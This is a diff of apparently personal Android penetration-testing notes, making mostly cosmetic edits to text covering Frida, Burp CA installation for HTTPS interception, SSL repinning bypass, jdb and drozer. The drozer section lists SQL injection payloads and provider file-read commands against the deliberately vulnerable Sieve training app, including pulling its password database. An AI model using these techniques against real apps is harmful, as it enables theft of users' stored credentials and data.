@@ -197,7 +197,7 @@ Java.perform(function () {
 ```
 
 ```
-# get your android version
+# get your Android version
 [Android Emulator 5554::com.twitter.android.lite]-&gt; Java.androidVersion
 "9"
 
@@ -286,7 +286,7 @@ $ r2 frida://[PID]
 In order to intercept HTTPS as well, we need a system-wide CA: [link](https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/#install-burp-ca-as-a-system-level-trusted-ca), [link](https://stackoverflow.com/questions/13089694/adb-remount-permission-denied-but-able-to-access-super-user-in-shell-android). First download the Burp CA and start the emulator as writable (always):
 
 ```
-# convert burp CA to work with android
+# convert burp CA to work with Android
 $ openssl x509 -inform DER -in cacert.der -out cacert.pem
 $ openssl x509 -inform PEM -subject\_hash\_old -in cacert.pem |head -1
 $ mv cacert.pem 9a5ba575.0
@@ -388,7 +388,7 @@ emulator () {
 For an AVD:
 
 ```
-$ emulator @Nexus\_5X\_API\_23 -http-proxy 127.0.0.1:8080
+$ emulator @Nexus_5X_API_23 -http-proxy 127.0.0.1:8080
 ```
 
 Connect your phone to your laptop over USB.
@@ -417,7 +417,7 @@ $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt
 $ frida -U -f com.app.mobile -l frida-android-repinning.js --no-pause
 ```
 
-Busybox: it gives you a lot of linux tools that are not a part of android.
+Busybox: it gives you a lot of linux tools that are not a part of Android.
 It doesn't require rooting your phone. For example using text editors.
 
 ```
@@ -457,7 +457,7 @@ $ jdb -attach localhost:1337
 $ { echo "suspend"; cat; } | jdb -attach localhost:1337
 ```
 
-Some useful jdb android commands:
+Some useful jdb commands:
 
 ```
 &gt; classes
@@ -521,11 +521,11 @@ You can then download [sieve](https://github.com/mwrlabs/drozer/releases/downloa
 $ adb install sieve.apk
 
 # find package name
-dz&gt; run app.package.list -f sieve
+dz> run app.package.list -f sieve
 com.mwr.example.sieve (Sieve)
 
 # get package info
-dz&gt; run app.package.info -a com.mwr.example.sieve
+dz> run app.package.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   Application Label: Sieve
   Process Name: com.mwr.example.sieve
@@ -545,7 +545,7 @@ Package: com.mwr.example.sieve
   - com.mwr.example.sieve.WRITE\_KEYS
 
 # finding attack surface
-dz&gt; run app.package.attacksurface com.mwr.example.sieve
+dz> run app.package.attacksurface com.mwr.example.sieve
   3 activities exported
   0 broadcast receivers exported
   2 content providers exported
@@ -553,28 +553,28 @@ dz&gt; run app.package.attacksurface com.mwr.example.sieve
     is debuggable
 
 # get exported activities
-dz&gt; run app.activity.info -a com.mwr.example.sieve
+dz> run app.activity.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.FileSelectActivity
   com.mwr.example.sieve.MainLoginActivity
   com.mwr.example.sieve.PWList
 
 # run an activity (PWList) directly using:
-dz&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
+dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
 
 # list accessible content URIs
-dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve
+dz> run scanner.provider.finduris -a com.mwr.example.sieve
 
 # database based content URIs
-dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
-dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
-dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
-dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
-dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--projection "*FROM Key;--"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--projection "*FROM Key;--"
 
 # filesystem based content URIs
-dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
-dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/abhay/Desktop/database.db
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
+dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/abhay/Desktop/database.db
 Written 4096 bytes
 ```
 
@@ -592,8 +592,8 @@ $ sudo update-alternatives --config java
 $ sudo update-alternatives --config javac
 
 # add these lines to your ~/.profile
-export JAVA\_HOME=/usr/lib/jvm/&lt;java-version&gt;
-export PATH=$PATH:/usr/lib/jvm/&lt;java-version&gt;/bin
+export JAVA_HOME=/usr/lib/jvm/java-version
+export PATH=$PATH:/usr/lib/jvm/java-version/bin
 ```
 
 
